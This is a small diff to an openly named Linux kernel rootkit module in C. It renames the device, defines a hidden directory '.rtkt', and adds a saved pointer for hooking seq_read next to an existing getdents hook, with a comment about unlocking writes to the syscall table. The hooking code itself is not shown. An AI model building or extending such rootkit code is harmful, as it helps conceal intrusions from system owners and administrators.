@@ -13,10 +13,10 @@
 #include <linux/syscalls.h>
 #include <linux/dirent.h>
 
-#define DEVICE_NAME "rootkit-test"
+#define DEVICE_NAME "rootkit-interface"
+#define HIDDEN_DIR ".rtkt"
 #define TEST_MSG "Inserting Rootkit"
 #define MSG_BUF_LEN 100
-#define HIDDEN_DIR ".rtkt"
 
 //Device function declerations
 static int rootkit_load(void);
@@ -37,6 +37,7 @@ static int USE_COUNT = 0;
 
 //Globals for intercepts
 static typeof(sys_getdents) *orig_getdents;
+static typeof(seq_read) *orig_proc_read;
 
 //Allow writes to sys_call_table
 #define CRO_WRITE_UNLOCK(x) \
